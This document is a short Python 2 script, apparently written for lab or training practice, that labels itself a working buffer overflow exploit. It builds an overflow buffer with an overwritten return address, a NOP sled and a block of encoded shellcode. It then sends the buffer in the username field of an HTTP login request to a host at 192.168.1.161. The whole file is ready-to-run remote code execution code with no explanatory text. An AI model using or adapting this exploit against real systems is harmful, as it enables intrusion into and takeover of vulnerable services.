#!/usr/bin/python
#working buffer overflow exploit! (code works!)
# This script only works for python version 2 and not on version 3
import socket
import sys

print("\nSending evil buffer...\n\n")

filler = "A" * 780
EIP = "\x83\x0c\x09\x10"
offset = "C" * 4
shellcode = ("\xbd\x86\x61\x9e\xc5\xdb\xd4\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xc2\x04\x31\x6a\x0e\x03\xec\x6f\x7c\x30\x0c\x87\x02"
"\xbb\xec\x58\x63\x35\x09\x69\xa3\x21\x5a\xda\x13\x21\x0e\xd7"
"\xd8\x67\xba\x6c\xac\xaf\xcd\xc5\x1b\x96\xe0\xd6\x30\xea\x63"
"\x55\x4b\x3f\x43\x64\x84\x32\x82\xa1\xf9\xbf\xd6\x7a\x75\x6d"
"\xc6\x0f\xc3\xae\x6d\x43\xc5\xb6\x92\x14\xe4\x97\x05\x2e\xbf"
"\x37\xa4\xe3\xcb\x71\xbe\xe0\xf6\xc8\x35\xd2\x8d\xca\x9f\x2a"
"\x6d\x60\xde\x82\x9c\x78\x27\x24\x7f\x0f\x51\x56\x02\x08\xa6"
"\x24\xd8\x9d\x3c\x8e\xab\x06\x98\x2e\x7f\xd0\x6b\x3c\x34\x96"
"\x33\x21\xcb\x7b\x48\x5d\x40\x7a\x9e\xd7\x12\x59\x3a\xb3\xc1"
"\xc0\x1b\x19\xa7\xfd\x7b\xc2\x18\x58\xf0\xef\x4d\xd1\x5b\x78"
"\xa1\xd8\x63\x78\xad\x6b\x10\x4a\x72\xc0\xbe\xe6\xfb\xce\x39"
"\x08\xd6\xb7\xd5\xf7\xd9\xc7\xfc\x33\x8d\x97\x96\x92\xae\x73"
"\x66\x1a\x7b\xd3\x36\xb4\xd4\x94\xe6\x74\x85\x7c\xec\x7a\xfa"
"\x9d\x0f\x51\x93\x34\xea\x32\x5c\x60\xf5\xa6\x34\x73\xf5\x27"
"\x7e\xfa\x13\x4d\x90\xab\x8c\xfa\x09\xf6\x46\x9a\xd6\x2c\x23"
"\x9c\x5d\xc3\xd4\x53\x96\xae\xc6\x04\x56\xe5\xb4\x83\x69\xd3"
"\xd0\x48\xfb\xb8\x20\x06\xe0\x16\x77\x4f\xd6\x6e\x1d\x7d\x41"
"\xd9\x03\x7c\x17\x22\x87\x5b\xe4\xad\x06\x29\x50\x8a\x18\xf7"
"\x59\x96\x4c\xa7\x0f\x40\x3a\x01\xe6\x22\x94\xdb\x55\xed\x70"
"\x9d\x95\x2e\x06\xa2\xf3\xd8\xe6\x13\xaa\x9c\x19\x9b\x3a\x29"
"\x62\xc1\xda\xd6\xb9\x41\xea\x9c\xe3\xe0\x63\x79\x76\xb1\xe9"
"\x7a\xad\xf6\x17\xf9\x47\x87\xe3\xe1\x22\x82\xa8\xa5\xdf\xfe"
"\xa1\x43\xdf\xad\xc2\x41")
NOPS = "\x90" * 10
inputBuffer = filler + EIP + offset + NOPS + shellcode

payload = "username=" + inputBuffer + "&password=aaaa"

buffer = "POST /login HTTP/1.1\r\n"
buffer += "Host: 192.168.1.161\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Accept-Encoding: gzip, deflate\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length: " + str(len(payload)) + "\r\n"
buffer += "Origin: http://192.168.1.161\r\n"
buffer += "Connection: close\r\n"
buffer += "Referer: http://192.168.1.161/login\r\n"
buffer += "Upgrade-Insecure-Requests: 1\r\n"
buffer += "\r\n"
buffer += payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.161", 80))
s.send(buffer)

s.close()

print("\nDone!")